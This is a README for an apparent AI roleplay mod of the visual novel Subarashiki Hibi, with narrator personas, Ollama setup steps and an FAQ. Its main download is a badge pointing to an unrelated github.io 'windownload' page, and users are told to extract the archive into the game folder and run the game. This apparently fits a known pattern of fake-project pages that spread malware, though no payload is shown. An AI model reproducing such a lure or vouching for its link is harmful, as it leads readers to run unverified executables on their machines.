## About

**Subarashiki Hibi — AI Edition** is structured the way the novel is: six chapters, each told by someone who does not have access to what the others know.

Choose a perspective and the AI's entire model of reality changes with it. Yuki's world is not Takuji's world, and neither of them is describing what actually happened. The mod never reconciles them for you.

> 🌤️ Perspective locking: the chosen narrator's persona is given only their own chapter's information. Contradictions between chapters are preserved, not resolved.

---

## ✨ Features

- 📖 **Six-chapter perspectives** — Each narrator has a strictly partitioned knowledge base.
- 🪞 **Contradiction preservation** — The mod refuses to harmonise the accounts. That's the work.
- 💭 **Philosophical mode** — The AI engages the Wittgenstein material seriously rather than name-dropping it.
- 🎭 **Persona fragmentation** — Characters with multiple selves are implemented as multiple prompts.
- 🔒 **Local, private, offline** — Given this material, that is not a small feature.
- 🖼️ **Full sprite integration** — Expression selection across the KeroQ asset set.

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Subarashiki Hibi

1. Start from a clean, working installation of **Subarashiki Hibi**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

## 🎯 Reading order

1. Play the chapters in the novel's order the first time. Perspective locking assumes it.
2. Do not enable cross-chapter knowledge until you've finished the game. It ruins the structure.
3. This mod rewards a large model more than almost any other here.

## ❓ FAQ

**Q: Content warnings?**
> Extensive. Sexual violence, suicide, abuse. Subarashiki Hibi is an 18+ work and the mod does not filter it.

**Q: Which release?**
> The Frontwing English PC release, standard directory.

**Q: Can I unlock everything at once?**
> Yes, one config flag — but it dismantles the entire point of the mod.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.
